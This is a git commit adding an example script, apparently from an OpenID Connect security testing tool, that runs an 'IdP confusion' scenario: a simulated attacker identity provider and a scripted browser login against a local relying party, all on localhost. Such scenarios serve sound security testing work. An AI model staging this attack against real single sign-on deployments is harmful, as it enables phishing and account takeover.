8bebf3d4c4559ee3a129667ac3ca4a48b666cea0
melonattacker <junkitombob@gmail.com>
2023-07-24 17:02:04 +0900

    ADD: IdP Confusion Scenario

---
+++ examples/rp/idp_confusion.py
@@ -0,0 +1,43 @@
+import sys
+import os
+import time
+
+sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))
+
+from browser import BrowserSimulator
+from attacker_idp import AttackerIdPClient
+import id_token
+
+ATTACKER_IDP_ENDPOINT = "http://localhost:3000"
+ATTACKER_IDP_ENDPOINT_CONTAINER = "http://attacker-idp:3000"
+HONEST_IDP_ENDPOINT = "http://localhost:3001"
+HONEST_IDP_ENDPOINT_CONTAINER = "http://honest-idp:3001"
+attakcer_idp_client = AttackerIdPClient(ATTACKER_IDP_ENDPOINT)
+
+try:
+    # add task to attacker idp
+    name = 'IdPConfusion'
+    args = {
+        'honest_idp_auth_endpoint': HONEST_IDP_ENDPOINT + '/auth'
+    }
+    task_id = attakcer_idp_client.add_task(name, args)
+    print(task_id)
+
+    time.sleep(5)
+
+    sso_flow = """page.locator('input[name="login"]').fill('hoge')
+page.locator('input[name="password"]').fill('huga')
+page.locator('button[type="submit"]').click()
+page.locator('button[type="submit"]').click()
+print(page.content())
+    """
+    
+    # fishing login
+    simulator = BrowserSimulator(f'http://localhost:5000/login?issuer={ATTACKER_IDP_ENDPOINT_CONTAINER}', 'http://localhost:8080')
+    simulator.run(sso_flow)
+    simulator.close()
+
+    attakcer_idp_client.delete_task()
+except Exception as e:
+    print('Error:', e)
+    # attakcer_idp_client.delete_task()
--- src/__main__.py
+++ src/__main__.py
@@ -2,20 +2,4 @@ from src import proxy
 from src import browser
 
 if __name__ == "__main__":
-    client = proxy.ProxyClient("http://localhost:5555")
-    # client.add_header("HOGE-HUGA", "hogehoge")
-    # client.modify_header("HOGE-HUGA", "hugahuga")
-    # client.add_body_param("hoge", "piyo")
-    # client.modify_body_param("username", "yuasa2")
-    # client.intercept("huga")
-    # print(len(client.get_history()["request"]), len(client.get_history()["response"]))
-    # for req in client.get_history()["request"]:
-    #     print(req)
-    # print("=====================================")
-    # for res in client.get_history()["response"]:
-    #     print(res)
-
-#     bs = browser.BrowserSimulator("https://example.com")
-#     bs.run('''page.goto("https://playwright.dev/")
-# page.screenshot(path="example.png")
-#     ''')
+    pass
